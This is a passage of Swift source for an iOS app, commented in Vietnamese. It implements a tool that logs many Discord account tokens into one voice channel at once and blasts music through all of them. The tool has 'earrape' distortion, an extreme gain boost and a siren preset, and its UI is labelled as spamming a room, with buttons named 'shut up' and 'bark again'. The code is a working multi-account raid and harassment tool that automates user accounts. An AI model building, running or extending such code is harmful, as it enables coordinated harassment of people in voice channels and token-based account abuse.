    @Published var bassAmount: Float = 0.0 // Trọng lực Bass: 0 to 100
    @Published var isCleanMode: Bool = false // !xoatapam: Lọc ồn chủ động (Highpass 150Hz + Lowpass 10kHz)
    @Published var isMaxMode: Bool = false // !max: Sát chiêu V9 Tối Thượng (EQ 80Hz + 3500Hz + Boost 2.5x)
    @Published var playbackSpeed: Float = 1.0 // Tốc độ phát: 0.75, 1.0, 1.25, 1.5
    @Published var audioFX: SpamAudioFX = .normal
    @Published var loopMode: PlaylistLoopMode = .loopAll // Vòng lặp vô hạn
    @Published var playLocalSpeaker: Bool = false // Loa ngoài (Mặc định tắt)

    // Dàn phiên âm thanh (Đa phân thân)
    @Published var activeSessions: [VoiceGatewaySession] = []
    private var streamTask: Task<Void, Never>?
    var currentDecoder: AudioTrackDecoder?
    private let opusEncoder = NativeOpusEncoder()
    private var streamFrameIndex = 0
    private var localPlayer: AVAudioPlayer?

    // DSP Filter States
    private var bassStateL: Float = 0
    private var bassStateR: Float = 0
    private var hpStateL: Float = 0
    private var hpStateR: Float = 0
    private var prevInL: Float = 0
    private var prevInR: Float = 0
    private var lpStateL: Float = 0
    private var lpStateR: Float = 0

    private override init() {
        super.init()
    }

    var currentTrack: PlaylistItem? {
        guard currentTrackIndex >= 0 && currentTrackIndex < playlist.count else { return nil }
        return playlist[currentTrackIndex]
    }

    func addLog(_ msg: String) {
        let log = VoiceLogEntry(id: UUID(), timestamp: Date(), message: msg)
        logs.append(log)
        if logs.count > 100 { logs.removeFirst(logs.count - 100) }
    }

    // MARK: - PLAYLIST QUEUE MANAGEMENT
    func addFiles(urls: [URL]) {
        for url in urls {
            let title = url.deletingPathExtension().lastPathComponent
            let asset = AVURLAsset(url: url)
            let dur = CMTimeGetSeconds(asset.duration)
            let durationSeconds = (dur.isNaN || dur.isInfinite) ? 0 : dur
            let item = PlaylistItem(
                id: UUID(),
                title: title,
                url: url,
                durationSeconds: durationSeconds,
                isPreset: false,
                preset: nil
            )
            if !playlist.contains(where: { $0.url?.path == url.path }) {
                playlist.append(item)
            }
        }
        addLog("📥 Đã nạp thêm \(urls.count) pháp bảo vào Linh Hồn Hàng Đợi (Tổng: \(playlist.count) bài)")
        statusText = "Đã có \(playlist.count) pháp bảo trong hàng đợi"

        if currentDecoder == nil && !playlist.isEmpty {
            selectTrack(index: 0)
        }
    }

    func addPreset(_ preset: MusicPreset) {
        let item = PlaylistItem(
            id: UUID(),
            title: preset.rawValue,
            url: nil,
            durationSeconds: 6.0,
            isPreset: true,
            preset: preset
        )
        playlist.append(item)
        addLog("📥 Đã nạp pháp bảo mẫu VIP: \(preset.rawValue)")
        if currentDecoder == nil {
            selectTrack(index: playlist.count - 1)
        }
    }

    func addAllPresets() {
        for p in MusicPreset.allCases {
            addPreset(p)
        }
    }

    func removeTrack(id: UUID) {
        if let idx = playlist.firstIndex(where: { $0.id == id }) {
            playlist.remove(at: idx)
            if playlist.isEmpty {
                stopSpam()
                currentDecoder = nil
                currentSongTitle = "Chưa nạp pháp bảo nhạc"
                audioFileURL = nil
                duration = 0
                currentTime = 0
                statusText = "Linh hồn hàng đợi đang trống rỗng"
            } else if currentTrackIndex >= playlist.count {
                selectTrack(index: playlist.count - 1)
            } else if currentTrackIndex == idx {
                selectTrack(index: currentTrackIndex)
            }
        }
    }

    func clearPlaylist() {
        stopSpam()
        playlist.removeAll()
        currentDecoder = nil
        currentSongTitle = "Chưa nạp pháp bảo nhạc"
        audioFileURL = nil
        duration = 0
        currentTime = 0
        statusText = "Đã giải tán toàn bộ hàng đợi nhạc"
        addLog("🗑️ Đã xóa sạch Linh Hồn Hàng Đợi")
    }

    func selectTrack(index: Int) {
        guard index >= 0 && index < playlist.count else { return }
        currentTrackIndex = index
        let item = playlist[index]
        currentSongTitle = item.title
        audioFileURL = item.url
        streamFrameIndex = 0
        currentTime = 0

        if item.isPreset, let preset = item.preset {
            generatePresetSamples(preset)
        } else if let url = item.url {
            loadDecoder(url: url)
        }
    }

    func playNext() {
        guard !playlist.isEmpty else { return }
        switch loopMode {
        case .loopOne:
            streamFrameIndex = 0
            currentTime = 0
            localPlayer?.currentTime = 0
        case .loopAll:
            let next = (currentTrackIndex + 1) % playlist.count
            selectTrack(index: next)
        case .shuffle:
            if playlist.count > 1 {
                var r = Int.random(in: 0..<playlist.count)
                if r == currentTrackIndex { r = (r + 1) % playlist.count }
                selectTrack(index: r)
            } else {
                streamFrameIndex = 0
                currentTime = 0
            }
        }
    }

    func playPrevious() {
        guard !playlist.isEmpty else { return }
        let prev = (currentTrackIndex - 1 + playlist.count) % playlist.count
        selectTrack(index: prev)
    }

    // MARK: - AUDIO DECODING
    private func loadDecoder(url: URL) {
        statusText = "Đang nạp: \(url.deletingPathExtension().lastPathComponent)..."
        Task.detached { [weak self] in
            guard let self = self else { return }
            if let decoder = AudioTrackDecoder(url: url) {
                await MainActor.run {
                    self.currentDecoder = decoder
                    self.duration = decoder.durationSeconds
                    self.currentTime = 0
                    self.statusText = self.isPlaying ? "🔥 Đang xả: \(self.currentSongTitle)" : "Đã sẵn sàng: \(self.currentSongTitle)"
                    if self.playLocalSpeaker {
                        self.setupLocalPlayer(url: url)
                        if self.isPlaying && !self.isPaused {
                            self.localPlayer?.play()
                        }
                    }
                }
            } else {
                await MainActor.run {
                    self.statusText = "❌ Lỗi định dạng pháp bảo không hỗ trợ"
                }
            }
        }
    }

    private func generatePresetSamples(_ preset: MusicPreset) {
        let sampleRate: Double = 48000.0
        let toneDuration: Double = 6.0
        let frameCount = Int(sampleRate * toneDuration)
        var left = [Float]()
        var right = [Float]()
        left.reserveCapacity(frameCount)
        right.reserveCapacity(frameCount)

        for i in 0..<frameCount {
            let t = Double(i) / sampleRate
            var sample: Float = 0
            switch preset {
            case .djVinahouse:
                let beat = fmod(t * (132.0 / 60.0), 1.0)
                let kick = beat < 0.15 ? sin(Float(2 * Double.pi * 55 * t) * (1.0 - Float(beat / 0.15))) : 0
                let lead = sin(Float(2 * Double.pi * 440 * t)) * 0.3
                sample = Float(kick * 0.7) + lead
            case .bassBoost:
                sample = sin(Float(2 * Double.pi * 50 * t)) * 0.8 + sin(Float(2 * Double.pi * 100 * t)) * 0.2
            case .loFi:
                sample = (sin(Float(2 * Double.pi * 261.6 * t)) + sin(Float(2 * Double.pi * 329.6 * t)) + sin(Float(2 * Double.pi * 392.0 * t))) * 0.25
            case .trollSiren:
                let freq = 750.0 + 200.0 * sin(2 * Double.pi * 2.0 * t)
                sample = sin(Float(2 * Double.pi * freq * t)) * 0.5
            case .whiteNoise:
                sample = Float.random(in: -0.2...0.2)
            }
            let clamped = max(-1.0, min(1.0, sample))
            left.append(clamped)
            right.append(clamped)
        }

        let decoder = AudioTrackDecoder(left: left, right: right, durationSeconds: toneDuration)
        self.currentDecoder = decoder
        self.duration = toneDuration
        self.currentTime = 0
        self.statusText = self.isPlaying ? "🔥 Đang xả: \(preset.rawValue)" : "Đã chọn: \(preset.rawValue)"
    }

    private func setupLocalPlayer(url: URL) {
        do {
            let session = AVAudioSession.sharedInstance()
            try session.setCategory(.playback, mode: .default, options: [])
            try session.setActive(true)

            localPlayer = try AVAudioPlayer(contentsOf: url)
            localPlayer?.delegate = self
            localPlayer?.numberOfLoops = (loopMode == .loopOne) ? -1 : 0
            localPlayer?.volume = min(1.0, volume)
            localPlayer?.prepareToPlay()
        } catch {}
    }

    // MARK: - BẮT ĐẦU XẢ ROOM TIÊN NGHỊCH (ĐA TOKEN ĐỒNG LOẠT MAKE SUPER VIP)
    func startSpam(app: AppState) {
        guard let decoder = currentDecoder, !decoder.leftSamples.isEmpty else {
            statusText = "❌ Chưa nạp pháp bảo nhạc vào hàng đợi"
            return
        }

        let inputCID = targetChannelId.trimmingCharacters(in: .whitespacesAndNewlines)
        let channelId = !inputCID.isEmpty ? inputCID : (selectedChannel?.id ?? "")
        guard !channelId.isEmpty else {
            statusText = "❌ Vui lòng nhập Channel ID hoặc chọn phòng xả"
            return
        }

        // Xác định danh sách Token tham chiến
        var tokensToUse: [TokenInfo] = []
        if multiTokenMode {
            if !app.selectedTokenIds.isEmpty {
                tokensToUse = app.tokens.filter { app.selectedTokenIds.contains($0.id) }
            } else if !app.tokens.isEmpty {
                tokensToUse = app.tokens
            }
        } else {
            if let st = selectedToken {
                tokensToUse = [st]
            } else if !customToken.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
                let t = customToken.trimmingCharacters(in: .whitespacesAndNewlines)
                tokensToUse = [TokenInfo(token: t, userId: "", username: "Custom Token", avatarHash: nil, isValid: true)]
            } else if let at = app.activeToken {
                tokensToUse = [at]
            } else if let f = app.tokens.first {
                tokensToUse = [f]
            }
        }

        guard !tokensToUse.isEmpty else {
            statusText = "❌ Chưa có Token nào sẵn sàng xuất thủ"
            return
        }

        stopSpam()

        isPlaying = true
        isPaused = false
        statusText = "⚡ Triệu tập \(tokensToUse.count) Đạo hữu xuất thủ..."
        streamFrameIndex = 0
        currentTime = 0
        addLog("⚡ Khởi động HỆ THỐNG TIÊN NGHỊCH: Triệu tập \(tokensToUse.count) Đạo hữu vào phòng [\(channelId)]")

        BackgroundManager.shared.start()
        NowPlayingHelper.shared.update(
            title: "Xả Cha VIP: \(currentSongTitle)",
            detail: "Đang phát vào kênh [\(channelId)] (\(tokensToUse.count) bot)"
        )

        Task { [weak self] in
            guard let self = self else { return }

            var guildId = self.selectedGuild?.id
            if guildId == nil || guildId!.isEmpty {
                await MainActor.run { self.statusText = "Đang tra cứu Server của phòng \(channelId)..." }
                if let firstTok = tokensToUse.first?.token {
                    guildId = await fetchGuildIdForChannel(token: firstTok, channelId: channelId)
                }
            }

            guard let gid = guildId, !gid.isEmpty else {
                await MainActor.run {
                    self.statusText = "❌ Không tìm thấy Server (Kiểm tra Channel ID hoặc quyền token)"
                    self.addLog("❌ Không tra cứu được Guild ID cho phòng \(channelId)")
                    self.isPlaying = false
                }
                return
            }

            await MainActor.run {
                self.statusText = "Đang kết nối toàn bộ \(tokensToUse.count) phân thân vào Voice UDP..."
            }

            var createdSessions: [VoiceGatewaySession] = []
            for token in tokensToUse {
                let session = VoiceGatewaySession(tokenInfo: token)
                session.onLog = { [weak self] msg in
                    DispatchQueue.main.async {
                        self?.addLog(msg)
                    }
                }
                session.start(
                    guildId: gid,
                    channelId: channelId,
                    mute: false,
                    deaf: false,
                    video: false
                )
                createdSessions.append(session)
            }

            await MainActor.run {
                self.activeSessions = createdSessions
            }

            var waited = 0
            while waited < 50 && self.isPlaying {
                let readyCount = createdSessions.filter { $0.isVoiceUDPReady }.count
                if readyCount > 0 && (readyCount == createdSessions.count || waited > 15) {
                    break
                }
                try? await Task.sleep(nanoseconds: 500_000_000)
                waited += 1
            }

            let readySessions = createdSessions.filter { $0.isVoiceUDPReady }
            guard !readySessions.isEmpty && self.isPlaying else {
                await MainActor.run {
                    if self.isPlaying {
                        self.statusText = "❌ Kết nối Voice thất bại (Hết thời gian chờ UDP)"
                        self.addLog("❌ Không thể thiết lập kênh UDP cho các phân thân")
                        self.stopSpam()
                    }
                }
                return
            }

            await MainActor.run {
                self.statusText = "🔥 Đang xả hỏa lực: \(self.currentSongTitle) (\(readySessions.count) Đạo hữu)"
                self.addLog("🔥 Trận pháp đã kết thành! \(readySessions.count)/\(createdSessions.count) phân thân bắt đầu xả nhạc đồng loạt!")

                for s in readySessions {
                    s.setSpeaking(true)
                }

                if self.playLocalSpeaker, let url = self.audioFileURL {
                    self.setupLocalPlayer(url: url)
                    self.localPlayer?.play()
                }

                self.startStreamingTask()
            }
        }
    }

    // MARK: - SÁT CHIÊU CÂM MỒM (!cam) & SỦA TIẾP (!sua)
    func pauseSpam() {
        guard isPlaying else { return }
        isPaused = true
        for s in activeSessions {
            s.setSpeaking(false)
        }
        localPlayer?.pause()
        statusText = "🔇 Đã phong ấn âm thanh (Câm mồm)"
        addLog("🔇 Đã phong ấn âm thanh (Câm mồm). Giữ nguyên toàn bộ phân thân trong phòng.")
    }

    func resumeSpam() {
        guard isPlaying else { return }
        isPaused = false
        for s in activeSessions where s.isVoiceUDPReady {
            s.setSpeaking(true)
        }
        localPlayer?.play()
        statusText = "🔊 Đã giải ấn! Tiếp tục xả hỏa lực"
        addLog("🔊 Đã giải ấn! Tiếp tục xả hỏa lực y như lúc ban đầu.")
    }

    // MARK: - BẾ QUAN / THU HỒI PHÂN THÂN (!exit)
    func stop() {
        stopSpam()
    }

    func stopSpam() {
        isPlaying = false
        isPaused = false
        streamTask?.cancel()
        streamTask = nil

        let silence = Data([0xF8, 0xFF, 0xFE])
        for session in activeSessions {
            for _ in 0..<5 {
                session.sendOpusPacket(silence)
            }
            session.setSpeaking(false)
            session.stop()
        }
        activeSessions.removeAll()

        localPlayer?.stop()
        localPlayer = nil

        statusText = "⛩️ Bế quan (Đã thu hồi toàn bộ phân thân)"
        addLog("⛩️ Đã bế quan, giải tán hàng đợi nhạc và thu hồi toàn bộ phân thân.")
        currentTime = 0
        streamFrameIndex = 0
    }

    func seek(to seconds: Double) {
        guard let decoder = currentDecoder, decoder.durationSeconds > 0 else { return }
        let fraction = min(1.0, max(0.0, seconds / decoder.durationSeconds))
        streamFrameIndex = Int(Double(decoder.totalFrames) * fraction)
        currentTime = seconds
        localPlayer?.currentTime = seconds
    }

    // MARK: - STREAMING ENGINE ĐA PHÂN THÂN MAKE SUPER VIP
    private func startStreamingTask() {
        streamTask?.cancel()

        streamTask = Task.detached { [weak self] in
            guard let self = self else { return }
            var speedAccumulator: Float = 0
            let encoder = NativeOpusEncoder()

            var hpStateL: Float = 0
            var hpStateR: Float = 0
            var prevInL: Float = 0
            var prevInR: Float = 0
            var lpStateL: Float = 0
            var lpStateR: Float = 0
            var bassStateL: Float = 0
            var bassStateR: Float = 0

            while !Task.isCancelled {
                let start = DispatchTime.now()

                let snapshot = await MainActor.run { () -> (curIdx: Int, currentVol: Float, currentBoost: Float, bassAmt: Float, isClean: Bool, isMax: Bool, isPaused: Bool, currentFX: SpamAudioFX, currentSpeed: Float, decoder: AudioTrackDecoder?, readySessions: [VoiceGatewaySession]) in
                    return (
                        self.streamFrameIndex,
                        self.volume,
                        self.boostMultiplier,
                        self.bassAmount,
                        self.isCleanMode,
                        self.isMaxMode,
                        self.isPaused,
                        self.audioFX,
                        self.playbackSpeed,
                        self.currentDecoder,
                        self.activeSessions.filter { $0.isVoiceUDPReady }
                    )
                }

                if snapshot.isPaused {
                    try? await Task.sleep(nanoseconds: 20_000_000)
                    continue
                }

                guard let decoder = snapshot.decoder, !decoder.leftSamples.isEmpty else {
                    try? await Task.sleep(nanoseconds: 20_000_000)
                    continue
                }

                let leftSamples = decoder.leftSamples
                let rightSamples = decoder.rightSamples
                let totalSamples = leftSamples.count

                let startSample = snapshot.curIdx * 960
                let endSample = startSample + 960

                if endSample > totalSamples {
                    await MainActor.run {
                        self.playNext()
                    }
                    try? await Task.sleep(nanoseconds: 20_000_000)
                    continue
                }

                var chunkL = Array(leftSamples[startSample..<endSample])
                var chunkR = Array(rightSamples[startSample..<endSample])

                // 1. Lọc ồn chủ động (Highpass 150Hz + Lowpass 10kHz)
                if snapshot.isClean {
                    for i in 0..<960 {
                        hpStateL = 0.98 * (hpStateL + chunkL[i] - prevInL)
                        prevInL = chunkL[i]
                        chunkL[i] = hpStateL

                        hpStateR = 0.98 * (hpStateR + chunkR[i] - prevInR)
                        prevInR = chunkR[i]
                        chunkR[i] = hpStateR

                        lpStateL += 0.75 * (chunkL[i] - lpStateL)
                        chunkL[i] = lpStateL
                        lpStateR += 0.75 * (chunkR[i] - lpStateR)
                        chunkR[i] = lpStateR
                    }
                }

                // 2. Sát chiêu V9 Tối Thượng hoặc Trọng Lực Bass
                if snapshot.isMax {
                    for i in 0..<960 {
                        bassStateL += 0.35 * (chunkL[i] - bassStateL)
                        chunkL[i] = chunkL[i] + bassStateL * 2.2
                        bassStateR += 0.35 * (chunkR[i] - bassStateR)
                        chunkR[i] = chunkR[i] + bassStateR * 2.2

                        let biteL = chunkL[i] - bassStateL
                        chunkL[i] += biteL * 1.6
                        let biteR = chunkR[i] - bassStateR
                        chunkR[i] += biteR * 1.6

                        chunkL[i] = tanh(chunkL[i] * 2.5)
                        chunkR[i] = tanh(chunkR[i] * 2.5)
                    }
                } else if snapshot.bassAmt > 0 || snapshot.currentFX == .bassBoost {
                    let factor = (snapshot.bassAmt / 50.0) + (snapshot.currentFX == .bassBoost ? 1.0 : 0.0)
                    for i in 0..<960 {
                        bassStateL += 0.28 * (chunkL[i] - bassStateL)
                        chunkL[i] = max(-1.0, min(1.0, chunkL[i] + bassStateL * (1.2 * factor)))
                        bassStateR += 0.28 * (chunkR[i] - bassStateR)
                        chunkR[i] = max(-1.0, min(1.0, chunkR[i] + bassStateR * (1.2 * factor)))
                    }
                }

                // 3. Earrape FX
                if snapshot.currentFX == .earrape {
                    for i in 0..<960 {
                        chunkL[i] = tanh(chunkL[i] * 4.0)
                        chunkR[i] = tanh(chunkR[i] * 4.0)
                    }
                }

                // 4. Chân hỏa Volume & Ép xung Boost (Volume * Boost)
                let totalGain = snapshot.currentVol * snapshot.currentBoost
                if totalGain != 1.0 {
                    for i in 0..<960 {
                        chunkL[i] = tanh(chunkL[i] * totalGain)
                        chunkR[i] = tanh(chunkR[i] * totalGain)
                    }
                }

                // 5. Mã hóa Opus và gửi tới toàn bộ các phân thân Đạo Hữu
                if let opus = encoder?.encode(leftChannel: chunkL, rightChannel: chunkR) {
                    for s in snapshot.readySessions {
                        s.sendOpusPacket(opus)
                    }
                }

                // 6. Cập nhật tiến độ & visualizer
                var effSpeed = snapshot.currentSpeed
                if snapshot.currentFX == .nightcore { effSpeed = 1.25 }
                else if snapshot.currentFX == .slowed { effSpeed = 0.85 }

                speedAccumulator += effSpeed
                let advance = max(1, Int(speedAccumulator))
                speedAccumulator -= Float(advance)

                await MainActor.run {
                    self.streamFrameIndex += advance
                    if self.streamFrameIndex % 5 == 0 {
                        self.currentTime = Double(self.streamFrameIndex * 960) / 48000.0
                        self.visualizerLevels = (0..<8).map { _ in CGFloat.random(in: 0.2...0.95) }
                    }
                }

                let elapsedNanos = DispatchTime.now().uptimeNanoseconds - start.uptimeNanoseconds
                let targetNanos: UInt64 = 20_000_000
                if targetNanos > elapsedNanos {
                    try? await Task.sleep(nanoseconds: targetNanos - elapsedNanos)
                }
            }
        }
    }

    nonisolated func audioPlayerDidFinishPlaying(_ player: AVAudioPlayer, successfully flag: Bool) {
        Task { @MainActor [weak self] in
            guard let self = self else { return }
            self.playNext()
        }
    }
}

// ==============================================================================
// MARK: - VOICE ROOM & XẢ MIC TAB VIEW (GIAO DIỆN CHÍNH MAKE SUPER VIP)
// ==============================================================================
struct VoiceRoomTabView: View {
    @EnvironmentObject var app: AppState
    @EnvironmentObject var voiceRoom: VoiceRoomManager
    @EnvironmentObject var musicStream: MusicStreamManager

    @State private var mode: TabMode = .xaMic
    enum TabMode: String, CaseIterable, Identifiable {
        case xaMic = "Xả Nhạc (Super VIP)"
        case treoRoom = "Treo Room 24/7"
        var id: String { rawValue }
    }

    @State private var showGuildPicker = false
    @State private var showDocumentPicker = false

    var body: some View {
        NavigationStack {
            VStack(spacing: 0) {
                // Header Banner Tiên Nghịch Make Super VIP
                headerBanner

                Picker("Chế độ", selection: $mode) {
                    Label("Xả Nhạc (Super VIP)", systemImage: "flame.fill").tag(TabMode.xaMic)
                    Label("Treo Room 24/7", systemImage: "waveform").tag(TabMode.treoRoom)
                }
                .pickerStyle(.segmented)
                .padding(.horizontal)
                .padding(.vertical, 8)

                ScrollView {
                    VStack(spacing: 16) {
                        if mode == .xaMic {
                            makeSuperVipSection
                        } else {
                            treoRoomSection
                        }
                    }
                    .padding()
                }
            }
            .navigationTitle(mode == .xaMic ? "Xả Nhạc Make Super VIP" : "Treo Voice 24/7")
            .navigationBarTitleDisplayMode(.inline)
            .sheet(isPresented: $showGuildPicker) {
                VoiceGuildPickerSheet(isForSpam: mode == .xaMic)
            }
            .sheet(isPresented: $showDocumentPicker) {
                DocumentPicker(contentTypes: [.audio], allowsMultipleSelection: true) { _ in } onPickMultiple: { urls in
                    musicStream.addFiles(urls: urls)
                }
            }
        }
    }

    // MARK: - HEADER BANNER TIÊN NGHỊCH MAKE SUPER VIP
    private var headerBanner: some View {
        HStack(spacing: 10) {
            Image(systemName: "flame.fill")
                .foregroundColor(.red)
                .font(.title3)

            VStack(alignment: .leading, spacing: 1) {
                Text("TIÊN NGHỊCH [XẢ CHA - ĐỘC TÔN]")
                    .font(.caption.bold())
                    .foregroundColor(.red)
                Text("HỆ THỐNG XẢ NHẠC ĐA PHÂN THÂN BẤT TỬ • ĐIỀU KHIỂN CẢM ỨNG 100%")
                    .font(.system(size: 9, weight: .bold))
                    .foregroundColor(.secondary)
            }

            Spacer()

            Text("MAKE SUPER VIP")
                .font(.system(size: 10, weight: .black))
                .padding(.horizontal, 8)
                .padding(.vertical, 4)
                .background(LinearGradient(colors: [.red, .purple], startPoint: .leading, endPoint: .trailing))
                .foregroundColor(.white)
                .cornerRadius(6)
        }
        .padding(.horizontal)
        .padding(.top, 6)
    }

    // MARK: - MAKE SUPER VIP SECTION (XẢ NHẠC TIÊN NGHỊCH ĐA PHÂN THÂN)
    private var makeSuperVipSection: some View {
        VStack(spacing: 14) {
            nowPlayingCard
            tokenAndChannelCard
            playlistQueueCard
            combatEffectsCard
            mainActionCard
            battleLogsCard
        }
    }

    // Card 1: Trạng Thái Hỏa Lực & Now Playing Controller
    private var nowPlayingCard: some View {
        VStack(spacing: 12) {
            HStack(spacing: 8) {
                Circle()
                    .fill(musicStream.isPlaying ? (musicStream.isPaused ? Color.yellow : Color.red) : Color.secondary)
                    .frame(width: 10, height: 10)

                Text(musicStream.statusText)
                    .font(.subheadline.bold())
                    .foregroundStyle(musicStream.isPlaying ? (musicStream.isPaused ? .yellow : .red) : .primary)
                    .lineLimit(1)

                Spacer()

                if musicStream.isPlaying {
                    let readyCount = musicStream.activeSessions.filter { $0.isVoiceUDPReady }.count
                    Text("⚡ \(readyCount) ĐẠO HỮU")
                        .font(.system(size: 10, weight: .black))
                        .padding(.horizontal, 6)
                        .padding(.vertical, 2)
                        .background(Color.red.opacity(0.15))
                        .foregroundStyle(.red)
                        .cornerRadius(4)
                }
            }

            if musicStream.isPlaying && !musicStream.isPaused {
                HStack(spacing: 6) {
                    ForEach(0..<8, id: \.self) { i in
                        RoundedRectangle(cornerRadius: 3)
                            .fill(LinearGradient(colors: [.red, .orange, .purple], startPoint: .bottom, endPoint: .top))
                            .frame(width: 8, height: max(10, musicStream.visualizerLevels[i] * 38))
                            .animation(.spring(response: 0.15, dampingFraction: 0.5), value: musicStream.visualizerLevels[i])
                    }
                }
                .frame(height: 40)
            }

            HStack(spacing: 8) {
                Image(systemName: "music.note").foregroundStyle(.red)
                Text(musicStream.isPlaying ? "▶️ [ĐANG XẢ]: \(musicStream.currentSongTitle)" : musicStream.currentSongTitle)
                    .font(.subheadline.bold())
                    .foregroundColor(musicStream.isPlaying ? .red : .primary)
                    .lineLimit(1)
                Spacer()
            }

            if musicStream.duration > 0 {
                VStack(spacing: 2) {
                    Slider(
                        value: Binding(
                            get: { musicStream.currentTime },
                            set: { val in musicStream.seek(to: val) }
                        ),
                        in: 0...max(musicStream.duration, 1.0)
                    )
                    .tint(.red)

                    HStack {
                        Text(formatSeconds(musicStream.currentTime)).font(.caption2).foregroundStyle(.secondary)
                        Spacer()
                        Text(formatSeconds(musicStream.duration)).font(.caption2).foregroundStyle(.secondary)
                    }
                }
            }

            HStack(spacing: 12) {
                if musicStream.isPlaying {
                    Button {
                        if musicStream.isPaused {
                            musicStream.resumeSpam()
                        } else {
                            musicStream.pauseSpam()
                        }
                    } label: {
                        HStack(spacing: 4) {
                            Image(systemName: musicStream.isPaused ? "speaker.wave.3.fill" : "speaker.slash.fill")
                            Text(musicStream.isPaused ? "🔊 Sủa Tiếp" : "🔇 Câm Mồm")
                        }
                        .font(.caption.bold())
                        .padding(.horizontal, 10)
                        .padding(.vertical, 8)
                        .background(musicStream.isPaused ? Color.green.opacity(0.15) : Color.yellow.opacity(0.15))
                        .foregroundColor(musicStream.isPaused ? .green : .yellow)
                        .cornerRadius(8)
                    }
                }

                Button {
                    musicStream.playPrevious()
                } label: {
                    Image(systemName: "backward.fill").font(.subheadline).foregroundColor(.primary)
                }
                .disabled(musicStream.playlist.isEmpty)

                Button {
                    musicStream.playNext()
                } label: {
                    HStack(spacing: 2) {
                        Text("⏭️")
                        Text("Next").font(.caption.bold())
                    }
                    .padding(.horizontal, 8)
                    .padding(.vertical, 6)
                    .background(Color(UIColor.tertiarySystemBackground))
                    .cornerRadius(6)
                }
                .disabled(musicStream.playlist.isEmpty)

                Spacer()

                Button {
                    switch musicStream.loopMode {
                    case .loopAll: musicStream.loopMode = .loopOne
                    case .loopOne: musicStream.loopMode = .shuffle
                    case .shuffle: musicStream.loopMode = .loopAll
                    }
                } label: {
                    HStack(spacing: 4) {
                        Image(systemName: musicStream.loopMode.icon)
                        Text(musicStream.loopMode.rawValue).font(.caption2.bold())
                    }
                    .padding(.horizontal, 8)
                    .padding(.vertical, 6)
                    .background(Color.red.opacity(0.15))
                    .foregroundColor(.red)
                    .cornerRadius(8)
                }
            }
        }
        .padding()
        .background(Color(UIColor.secondarySystemBackground))
        .cornerRadius(15)
    }

    // Card 2: Cấu Hình Trận Pháp & Kênh Xả
    private var tokenAndChannelCard: some View {
        VStack(alignment: .leading, spacing: 12) {
            HStack {
                Image(systemName: "person.3.fill").foregroundStyle(.red)
                Text("Trận Pháp Đạo Hữu").font(.headline)
                Spacer()
                Text(musicStream.multiTokenMode ? "⚔️ Toàn Bộ Dàn (\(activeTokens.count))" : "Chỉ 1 Token")
                    .font(.caption2.bold())
                    .foregroundColor(.red)
            }

            Picker("Chế độ Token", selection: $musicStream.multiTokenMode) {
                Text("⚔️ Xả Cả Dàn Token (\(activeTokens.count))").tag(true)
                Text("Chỉ 1 Token").tag(false)
            }
            .pickerStyle(.segmented)

            if !musicStream.multiTokenMode {
                HStack {
                    Text("Token xuất thủ:").font(.subheadline.bold())
                    Spacer()
                    Menu {
                        ForEach(app.tokens) { t in
                            Button {
                                musicStream.selectedToken = t
                            } label: {
                                HStack {
                                    Text(t.username)
                                    if (musicStream.selectedToken?.id ?? app.activeToken?.id) == t.id {
                                        Image(systemName: "checkmark")
                                    }
                                }
                            }
                        }
                    } label: {
                        HStack(spacing: 6) {
                            let currentTok = musicStream.selectedToken ?? app.activeToken ?? app.tokens.first
                            if let t = currentTok {
                                if let url = t.avatarURL {
                                    AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                                    placeholder: { Circle().fill(.gray) }
                                    .frame(width: 22, height: 22).clipShape(Circle())
                                }
                                Text(t.username).font(.subheadline.bold())
                            } else {
                                Text("Chưa có token").font(.subheadline).foregroundStyle(.secondary)
                            }
                            Image(systemName: "chevron.up.chevron.down").font(.caption)
                        }
                        .padding(.horizontal, 10)
                        .padding(.vertical, 6)
                        .background(Color(UIColor.tertiarySystemBackground))
                        .cornerRadius(8)
                    }
                }
            }

            Divider()

            VStack(alignment: .leading, spacing: 6) {
                Text("Kênh Thoại (Channel ID):").font(.subheadline.bold())
                HStack(spacing: 8) {
                    TextField("Dán ID Room Voice xả...", text: $musicStream.targetChannelId)
                        .textFieldStyle(.plain)
                        .padding(10)
                        .background(Color(UIColor.tertiarySystemBackground))
                        .cornerRadius(8)
                        .keyboardType(.numberPad)

                    Button {
                        showGuildPicker = true
                    } label: {
                        HStack(spacing: 4) {
                            Image(systemName: "speaker.wave.2.fill")
                            Text("Chọn Kênh")
                        }
                        .font(.caption.bold())
                        .foregroundColor(.white)
                        .padding(.horizontal, 12)
                        .padding(.vertical, 10)
                        .background(Color.red)
                        .cornerRadius(8)
                    }
                }

                if let g = musicStream.selectedGuild, let c = musicStream.selectedChannel {
                    HStack(spacing: 4) {
                        Image(systemName: "checkmark.circle.fill").foregroundStyle(.green).font(.caption2)
                        Text("\(g.name) > \(c.displayName)").font(.caption.bold()).foregroundStyle(.green)
                    }
                }
            }
        }
        .padding()
        .background(Color(UIColor.secondarySystemBackground))
        .cornerRadius(15)
    }

    // Card 3: Linh Hồn Hàng Đợi (Queue Playlist)
    private var playlistQueueCard: some View {
        VStack(alignment: .leading, spacing: 12) {
            HStack {
                Image(systemName: "music.note.list").foregroundStyle(.red)
                Text("📜 Danh Sách Pháp Bảo (\(musicStream.playlist.count) bài)").font(.headline)
                Spacer()

                Button {
                    showDocumentPicker = true
                } label: {
                    HStack(spacing: 4) {
                        Image(systemName: "folder.badge.plus")
                        Text("➕ Nạp file")
                    }
                    .font(.caption.bold())
                    .padding(.horizontal, 10)
                    .padding(.vertical, 6)
                    .background(Color.red.opacity(0.15))
                    .cornerRadius(8)
                }
            }

            HStack(spacing: 8) {
                Button {
                    musicStream.addAllPresets()
                } label: {
                    HStack(spacing: 4) {
                        Image(systemName: "star.fill").font(.caption2)
                        Text("Nạp Mẫu VIP").font(.caption.bold())
                    }
                    .padding(.horizontal, 8)
                    .padding(.vertical, 5)
                    .background(Color.orange.opacity(0.15))
                    .foregroundColor(.orange)
                    .cornerRadius(6)
                }

                if !musicStream.playlist.isEmpty {
                    Button {
                        musicStream.clearPlaylist()
                    } label: {
                        HStack(spacing: 4) {
                            Image(systemName: "trash").font(.caption2)
                            Text("Xóa Hết").font(.caption.bold())
                        }
                        .padding(.horizontal, 8)
                        .padding(.vertical, 5)
                        .background(Color.red.opacity(0.15))
                        .foregroundColor(.red)
                        .cornerRadius(6)
                    }
                }
            }

            if musicStream.playlist.isEmpty {
                VStack(spacing: 8) {
                    Image(systemName: "music.note")
                        .font(.system(size: 32))
